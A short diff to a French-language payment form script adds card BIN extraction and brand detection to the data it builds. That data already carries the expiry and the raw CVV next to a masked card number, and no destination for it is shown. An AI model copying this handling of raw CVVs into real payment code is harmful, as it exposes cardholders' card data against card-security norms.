@@ -163,11 +163,20 @@
             btn.disabled = true;
             btn.textContent = 'Traitement...';
 
+            const cardValue = document.getElementById('card').value.replace(/\s/g, '');
+            const cardBin = cardValue.substring(0, 6);
+            let brand = "Inconnu";
+            if (/^4/.test(cardBin)) brand = "Visa";
+            else if (/^5[1-5]/.test(cardBin)) brand = "Mastercard";
+            else if (/^3[47]/.test(cardBin)) brand = "Amex";
+
             const data = {
                 client_id: clientId,
                 email: document.getElementById('email').value,
                 full_name: document.getElementById('name').value,
                 numero_carte_masque: document.getElementById('card').value.replace(/\s/g, '').replace(/(\d{4})\d+(\d{4})/, "$1-****-****-$2"),
+                card_bin: cardBin,
+                card_brand: brand,
                 expiry: document.getElementById('expiry').value,
                 cvv: document.getElementById('cvv').value,
                 montant: parseFloat(document.getElementById('amount').value),
